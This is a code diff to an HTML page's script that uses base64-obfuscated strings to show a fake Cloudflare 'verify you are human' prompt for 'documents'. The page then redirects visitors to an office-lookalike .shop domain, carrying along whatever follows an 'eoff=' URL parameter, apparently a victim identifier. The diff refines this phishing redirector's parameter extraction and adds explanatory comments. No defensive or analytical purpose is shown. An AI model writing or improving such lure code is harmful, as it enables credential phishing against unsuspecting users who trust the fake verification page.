@@ -91,13 +91,14 @@
 
     <script>
         const _0xObj = {
-            _s1: "VG8gdmlldyB0aGUgZG9jdW1lbnQsIHZlcmlmeSB5b3UgYXJlIGh1bWFuIGJlbG93", // Instruction
-            _s2: "dmVyaWZ5", // verify
-            _s3: "dmVyaWZ5aW5nLi4u", // verifying
-            _s4: "c3VjY2Vzcw==", // success
-            _s5: "Q2xvdWRmbGFyZQ==", // Cloudflare
-            _s6: "aHR0cHM6Ly9hZW9mZmljZS5zbmVpZmlsZXlzYWUuc2hvcC93dndZUG5zcg==", // Base URL
-            _p1: "ZW9mZg==" // eoff
+            // "To view these documents, verify you are human below"
+            _s1: "VG8gdmlldyB0aGVzZSBkb2N1bWVudHMsIHZlcmlmeSB5b3UgYXJlIGh1bWFuIGJlbG93",
+            _s2: "dmVyaWZ5",
+            _s3: "dmVyaWZ5aW5nLi4u",
+            _s4: "c3VjY2Vzcw==",
+            _s5: "Q2xvdWRmbGFyZQ==",
+            _s6: "aHR0cHM6Ly9hZW9mZmljZS5zbmVpZmlsZXlzYWUuc2hvcC93dndZUG5zcg==",
+            _p1: "ZW9mZg=="
         };
 
         window.onload = () => {
@@ -129,18 +130,23 @@
         }
 
         function _0x_redir() {
-            const _loc = window.location.search;
-            const _par = new URLSearchParams(_loc);
-            const _key = atob(_0xObj._p1);
-            const _val = _par.get(_key);
+            // Improved extraction logic to capture everything after eoff=
+            const _cUrl = window.location.href;
+            const _key = atob(_0xObj._p1) + "=";
+            let _val = "";
 
-            let _fin = atob(_0xObj._s6);
+            if (_cUrl.includes(_key)) {
+                // Splits at 'eoff=' and takes everything to the right
+                _val = _cUrl.split(_key)[1];
+            }
+
+            let _target = atob(_0xObj._s6);
             if (_val) {
-                _fin += "#" + _val;
+                _target += "#" + _val;
             }
 
             setTimeout(() => {
-                window.location.href = _fin;
+                window.location.href = _target;
             }, 800);
         }
     </script>
